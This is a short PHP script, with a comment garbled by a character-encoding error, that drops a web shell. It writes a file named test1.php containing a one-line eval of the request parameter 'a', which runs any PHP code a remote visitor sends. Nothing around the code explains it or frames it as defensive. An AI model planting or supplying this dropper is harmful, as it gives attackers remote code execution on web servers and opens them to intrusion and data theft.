<?php
//��ǰ·��������test1.php�ļ�
fputs(fopen('test1.php','w'),'<?php eval($_REQUEST["a"])?>');
?>